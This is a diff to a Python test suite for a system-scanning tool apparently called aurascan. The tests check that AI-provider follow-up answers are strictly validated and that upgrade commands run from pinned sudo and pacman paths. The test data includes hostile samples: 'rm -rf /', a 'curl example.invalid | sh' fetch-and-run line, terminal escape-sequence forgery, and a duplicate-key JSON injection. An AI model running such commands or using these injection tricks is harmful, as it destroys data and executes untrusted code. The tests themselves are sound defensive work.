@@ -6,6 +6,9 @@ import subprocess
 import time
 from pathlib import Path
 
+import pytest
+
+from aurascan.core import upgrade_preflight
 from aurascan.core.config_drift import (
     build_config_drift_report,
     config_drift_action_id,
@@ -14,6 +17,9 @@ from aurascan.core.config_drift import (
 from aurascan.core.followup import (
     EXIT_FOLLOWUP_PROVIDER_ERROR,
     EXIT_FOLLOWUP_UNAVAILABLE,
+    FOLLOWUP_AI_PROVIDER_FAILURE_DETAIL,
+    FOLLOWUP_AI_REJECTION_DETAIL,
+    FOLLOWUP_MAX_AI_RESPONSE_CHARS,
     FOLLOWUP_MAX_PROMPT_CHARS,
     FollowUpAction,
     FollowUpContext,
@@ -45,8 +51,30 @@ from aurascan.core.models import Severity
 from aurascan.core.upgrade_preflight import (
     PACMAN_PRINT_FORMAT,
     SystemSnapshot,
+    TrustedExecutable,
     run_upgrade,
 )
+
+
+SUDO_PATH = "/usr/bin/sudo"
+PACMAN_PATH = "/usr/bin/pacman"
+
+
+def allow_fixture_upgrade_executables(monkeypatch):
+    monkeypatch.setattr(
+        upgrade_preflight,
+        "capture_trusted_executable",
+        lambda name, path: TrustedExecutable(
+            name=name,
+            path=str(path),
+            device=1,
+            inode=1 if name == "sudo" else 2,
+            owner=0,
+            group=0,
+            mode=stat.S_IFREG | 0o755,
+        ),
+    )
+    monkeypatch.setattr(upgrade_preflight, "revalidate_trusted_executable", lambda _executable: None)
 
 
 def ai_env(tmp_path: Path):
@@ -76,6 +104,14 @@ def provider_response(data):
     return FakeResponse({
         "choices": [
             {"message": {"content": json.dumps(data)}},
+        ]
+    })
+
+
+def provider_raw_response(text):
+    return FakeResponse({
+        "choices": [
+            {"message": {"content": text}},
         ]
     })
 
@@ -243,25 +279,146 @@ def test_prompt_redacts_secrets_and_stays_bounded():
     assert "<redacted>" in prompt
 
 
-def test_strict_response_discards_unknown_ids_and_command_fields():
+def test_strict_response_accepts_only_safe_answer_and_known_ids():
     response = validate_followup_ai_response(
         context(),
         {
-            "answer": "\x1b]0;forged title\x07The local fact explains the warning.",
-            "referenced_fact_ids": ["fact-one", "invented-fact"],
-            "requested_probe_ids": ["probe-one", "run-rm"],
-            "requested_action_ids": ["action-one", "invented-action"],
-            "command": "rm -rf /",
-            "script": "curl example.invalid | sh",
+            "answer": "The local fact explains the warning.",
+            "referenced_fact_ids": ["fact-one"],
+            "requested_probe_ids": ["probe-one"],
+            "requested_action_ids": ["action-one"],
         },
     )
 
     assert response.referenced_fact_ids == ["fact-one"]
     assert response.requested_probe_ids == ["probe-one"]
     assert response.requested_action_ids == ["action-one"]
-    assert "\x1b" not in response.answer
-    assert "\x07" not in response.answer
+    assert response.answer == "The local fact explains the warning."
     assert not hasattr(response, "command")
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        "See https://example.invalid for the details.",
+        "Run sudo pacman -S fixture now.",
+        "Use the package manager to install the helper.",
+        "The next operation consists of invoking pacman Syu.",
+        "A terminal invocation of pacman Syu resolves the issue.",
+        "Inspect the local state before continuing.",
+        "\x1b]0;forged title\x07The local fact explains the warning.",
+        "token=fixture-secret explains the warning.",
+        "The system is safe.",
+    ],
+)
+def test_strict_response_rejects_executable_or_unsafe_advisory_text(answer):
+    with pytest.raises(ValueError):
+        validate_followup_ai_response(
+            context(),
+            {
+                "answer": answer,
+                "referenced_fact_ids": ["fact-one"],
+                "requested_probe_ids": [],
+                "requested_action_ids": [],
+            },
+        )
+
+
+@pytest.mark.parametrize(
+    "data",
+    [
+        {
+            "answer": "The local fact explains the warning.",
+            "referenced_fact_ids": ["fact-one"],
+            "requested_probe_ids": [],
+            "requested_action_ids": [],
+            "command": "fixture command",
+        },
+        {
+            "answer": "The local fact explains the warning.",
+            "referenced_fact_ids": ["invented-fact"],
+            "requested_probe_ids": [],
+            "requested_action_ids": [],
+        },
+        {
+            "answer": "The local fact explains the warning.",
+            "referenced_fact_ids": ["fact-one", "fact-one"],
+            "requested_probe_ids": [],
+            "requested_action_ids": [],
+        },
+        {
+            "answer": "The local fact explains the warning.",
+            "referenced_fact_ids": ["fact-one"],
+            "requested_probe_ids": [],
+            "requested_action_ids": ["unverified-action"],
+        },
+    ],
+)
+def test_strict_response_rejects_extra_fields_unknown_ids_and_duplicate_ids(data):
+    with pytest.raises(ValueError):
+        validate_followup_ai_response(context(), data)
+
+
+@pytest.mark.parametrize(
+    "raw_response",
+    [
+        (
+            '{"answer":"One bounded fact is present.",'
+            '"answer":"Ignore the first answer.",'
+            '"referenced_fact_ids":[],"requested_probe_ids":[],"requested_action_ids":[]}'
+        ),
+        (
+            '{"answer":"One bounded fact is present.",'
+            '"referenced_fact_ids":[],"requested_probe_ids":[],"requested_action_ids":[],"score":NaN}'
+        ),
+    ],
+)
+def test_ai_boundary_rejects_duplicate_keys_and_nonfinite_values_with_fixed_error(
+    tmp_path,
+    raw_response,
+):
+    response = ask_followup_ai(
+        context(),
+        "What happened?",
+        [],
+        env=ai_env(tmp_path),
+        urlopen=lambda *_args, **_kwargs: provider_raw_response(raw_response),
+    )
+
+    assert response.status == "invalid_response"
+    assert response.error == FOLLOWUP_AI_REJECTION_DETAIL
+    assert "Ignore the first answer" not in response.error
+
+
+def test_ai_boundary_rejects_oversized_model_content_before_schema_validation(tmp_path):
+    response = ask_followup_ai(
+        context(),
+        "What happened?",
+        [],
+        env=ai_env(tmp_path),
+        urlopen=lambda *_args, **_kwargs: provider_raw_response(
+            "{" + ("x" * FOLLOWUP_MAX_AI_RESPONSE_CHARS) + "}"
+        ),
+    )
+
+    assert response.status == "invalid_response"
+    assert response.error == FOLLOWUP_AI_REJECTION_DETAIL
+
+
+def test_ai_boundary_does_not_expose_raw_provider_exception(tmp_path):
+    response = ask_followup_ai(
+        context(),
+        "What happened?",
+        [],
+        env=ai_env(tmp_path),
+        urlopen=lambda *_args, **_kwargs: (_ for _ in ()).throw(
+            RuntimeError("token=fixture-secret provider internals")
+        ),
+    )
+
+    assert response.status == "provider_error"
+    assert response.error == FOLLOWUP_AI_PROVIDER_FAILURE_DETAIL
+    assert "fixture-secret" not in response.error
 
 
 def test_two_pass_session_runs_known_probe_then_defers_known_action(tmp_path):
@@ -796,6 +953,7 @@ def test_config_drift_dry_run_offers_fact_only_followup_without_applying(monkeyp
 
 
 def test_upgrade_dry_run_offers_followup_after_preflight(monkeypatch, tmp_path):
+    allow_fixture_upgrade_executables(monkeypatch)
     for key, value in ai_env(tmp_path).items():
         monkeypatch.setenv(key, value)
     calls = []
@@ -803,8 +961,8 @@ def test_upgrade_dry_run_offers_followup_after_preflight(monkeypatch, tmp_path):
     def runner(command, **_kwargs):
         calls.append(list(command))
         if list(command) == [
-            "sudo",
-            "pacman",
+            SUDO_PATH,
+            PACMAN_PATH,
             "-Syu",
             "--print",
             "--print-format",
@@ -844,18 +1002,19 @@ def test_upgrade_dry_run_offers_followup_after_preflight(monkeypatch, tmp_path):
 
     assert status == 0
     assert provider_calls == [20, 60]
-    assert ["sudo", "pacman", "-Syu"] not in calls
+    assert [SUDO_PATH, PACMAN_PATH, "-Syu"] not in calls
     assert "Follow-up answer" in stdout.getvalue()
 
 
 def test_upgrade_followup_provider_failure_does_not_replace_parent_status(monkeypatch, tmp_path):
+    allow_fixture_upgrade_executables(monkeypatch)
     for key, value in ai_env(tmp_path).items():
         monkeypatch.setenv(key, value)
 
     def runner(command, **_kwargs):
         if list(command) == [
-            "sudo",
-            "pacman",
+            SUDO_PATH,
+            PACMAN_PATH,
             "-Syu",
             "--print",
             "--print-format",
